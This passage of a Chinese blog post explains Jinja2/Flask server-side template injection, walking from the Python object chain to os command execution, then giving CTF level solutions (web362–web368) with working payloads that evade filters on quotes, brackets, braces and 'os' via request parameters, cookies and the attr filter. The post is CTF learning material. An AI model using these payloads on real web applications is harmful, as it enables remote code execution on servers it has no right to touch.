<p>通过 <code>__init__</code>，攻击者可以访问 <code>__globals__</code>，即函数的全局命名空间。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__  # 返回全局命名空间</span><br></pre></td></tr></table></figure>
<p><code>__globals__</code> 的作用是让攻击者能够访问模块的全局变量，包括导入的模块（如 <code>os</code>、<code>subprocess</code> 等），从而实现任意代码执行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 1. 从对象跳转到类</span><br><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 2. 通过 mro 获取继承链</span><br><span class="line">&quot;&quot;.__class__.__mro__  # 返回 (&lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line"># 3. 跳转到 object 类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line"></span><br><span class="line"># 4. 获取所有子类</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br><span class="line"></span><br><span class="line"># 5. 寻找可利用的类（如包含 os 模块的类）X需要具体找</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X]</span><br><span class="line"></span><br><span class="line"># 6. 通过子类执行任意代码</span><br><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].system(&#x27;id&#x27;)</span><br></pre></td></tr></table></figure>
<p>下面这条链接有具体的原理解释，并且有推荐视频在链接的最下方</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61955196/article/details/132237648">https://blog.csdn.net/qq_61955196/article/details/132237648</a></p>
<h1>web362</h1>
<p>过滤了某些东西</p>
<p>好像是过滤了某些数字，从120到某些数字，但是这里的过滤有bug</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[400-50-50-50-50-50-18].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>就可以了</p>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;[].__class__.__base__.__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>builtins介绍：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Ladylittleleaf/p/10240096.html">https://www.cnblogs.com/Ladylittleleaf/p/10240096.html</a></p>
<h1>web363</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>过滤了’'和&quot;&quot;</p>
<p>用request来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=popen&amp;b=cat /flag&amp;name=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1>web364</h1>
<p>利用cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;x.__init__.__globals__.__builtins__.eval(request.cookies.a)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.a)&#125;&#125;</span><br><span class="line"></span><br><span class="line">Cookie: a=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure>
<h1>web365</h1>
<p>过滤了中括号</p>
<p>同364</p>
<h1>web366</h1>
<p>flask过滤器<a target="_blank" rel="noopener" href="https://blog.csdn.net/xujin0/article/details/96101004">https://blog.csdn.net/xujin0/article/details/96101004</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br></pre></td></tr></table></figure>
<h1>web367</h1>
<p>在366的基础上又ban了os</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=b=os&amp;name=&#123;&#123;(lipsum|attr(request.cookies.a)).get(request.values.b).popen(request.cookies.b).read()&#125;&#125;</span><br><span class="line">Cookie:a=__globals__;b=cat /flag</span><br><span class="line">或者全换了</span><br><span class="line">?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1>web368</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤了&#123;&#123;&#125;&#125;通过&#123;%%&#125;绕过，&#123;%%&#125;是执行函数用的，需要套用print</span><br><span class="line">?a=__globals__&amp;b=os&amp;c=cat /flag&amp;name=&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">向每个梦想加速</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/06/SSTI/">http://example.com/2025/03/06/SSTI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">向每个梦想加速</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a></div><div class="post-share"><div class="social-share" data-image="/img/touxiang.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/16/JWT/" title="JWT"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">JWT</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/03/05/phpCVE/" title="phpCVE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">phpCVE</div></div><div class="info-2"><div class="info-item-1">web311 不知道是什么东西，跟着wp做就莫名其妙拿到shell了 CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。 向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常。 该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下： 12345678910111213location ~ [^/]\.php(/|$) &#123; ... fastcgi_split_path_info ^(.+?\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass   php:9000; ...&#125; 攻击者可以使用换行符（％0a）来破坏fastcgi_split_path_info指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。 影响范围 在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">向每个梦想加速</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://user.qzone.qq.com/2325525993"><i class="fas fa-envelope"></i><span>qq空间</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">qq2325525993</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">语法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">1.1.</span> <span class="toc-text">变量</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">字符串过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.1.</span> <span class="toc-text">1、拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%8F%8D%E8%BD%AC"><span class="toc-number">2.2.</span> <span class="toc-text">2、反转</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81ascii%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.3.</span> <span class="toc-text">3、ascii转换</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">4、编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E5%88%A9%E7%94%A8chr%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.</span> <span class="toc-text">5、利用chr函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E5%9C%A8jinja2%E9%87%8C%E9%9D%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8-%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.6.</span> <span class="toc-text">6、在jinja2里面可以利用~进行拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.7.</span> <span class="toc-text">7、大小写转换</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#attr"><span class="toc-number">3.1.</span> <span class="toc-text">attr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#format"><span class="toc-number">3.2.</span> <span class="toc-text">format</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#first-last-random"><span class="toc-number">3.3.</span> <span class="toc-text">first last random</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join"><span class="toc-number">3.4.</span> <span class="toc-text">join</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lower"><span class="toc-number">3.5.</span> <span class="toc-text">lower</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#replace-reverse"><span class="toc-number">3.6.</span> <span class="toc-text">replace reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#string"><span class="toc-number">3.7.</span> <span class="toc-text">string</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select-unique"><span class="toc-number">3.8.</span> <span class="toc-text">select unique</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#list"><span class="toc-number">3.9.</span> <span class="toc-text">list</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">各种魔法方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">模板1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">模板2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">web362</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">web363</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">web364</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">11.</span> <span class="toc-text">web365</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">12.</span> <span class="toc-text">web366</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">13.</span> <span class="toc-text">web367</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">14.</span> <span class="toc-text">web368</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA2/" title="栈溢出2">栈溢出2</a><time datetime="2025-05-05T15:37:01.000Z" title="发表于 2025-05-05 23:37:01">2025-05-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">栈溢出</a><time datetime="2025-05-04T19:22:12.000Z" title="发表于 2025-05-05 03:22:12">2025-05-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/03/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" title="栈溢出危险函数">栈溢出危险函数</a><time datetime="2025-05-03T11:51:51.000Z" title="发表于 2025-05-03 19:51:51">2025-05-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/02/%E5%88%B7%E5%88%B7-%F0%9F%90%82%E6%9C%A8%E7%9A%84-%E7%93%B6%E9%A2%88%E5%88%B0%E4%BA%86/" title="刷刷,🐂木的,瓶颈到了">刷刷,🐂木的,瓶颈到了</a><time datetime="2025-05-02T15:34:00.000Z" title="发表于 2025-05-02 23:34:00">2025-05-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/30/XYctf/" title="XYctf">XYctf</a><time datetime="2025-04-30T07:36:19.000Z" title="发表于 2025-04-30 15:36:19">2025-04-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/beijing.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By 向每个梦想加速</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="MING,LOVE,ME" data-fontsize="10px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>